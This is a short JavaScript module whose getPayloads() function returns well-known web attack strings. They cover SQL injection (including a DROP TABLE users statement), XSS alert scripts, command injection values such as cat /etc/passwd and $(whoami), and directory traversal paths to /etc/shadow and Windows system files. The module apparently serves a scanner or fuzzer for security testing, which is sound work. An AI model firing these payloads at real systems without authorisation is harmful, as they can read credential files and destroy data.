export function getPayloads() {
    const sqlPayloads = [
      "' OR '1'='1",
      "' UNION SELECT null, null, null--",
      "'; DROP TABLE users;--",
      "admin' --",
      "' OR 1=1--"
    ];
  
    const xssPayloads = [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert('XSS')>",
      "<body onload=alert('XSS')>",
      "javascript:alert('XSS')"
    ];

    const commandInjectionPayloads = [
      "; ls -la",
      "&& whoami",
      "| id",
      "|| cat /etc/passwd",
      "`uname -a`",
      "$(whoami)"
    ];
  
    const directoryTraversalPayloads = [
      "../../../../etc/passwd",
      "../../../../../etc/shadow",
      "../../../../../../../../../../windows/system32/config/system",
      "../../../../../../../../../../boot.ini",
      "../../../var/log/apache2/access.log"
    ];
  
    return [...sqlPayloads, ...xssPayloads, ...commandInjectionPayloads, ...directoryTraversalPayloads];
  }
  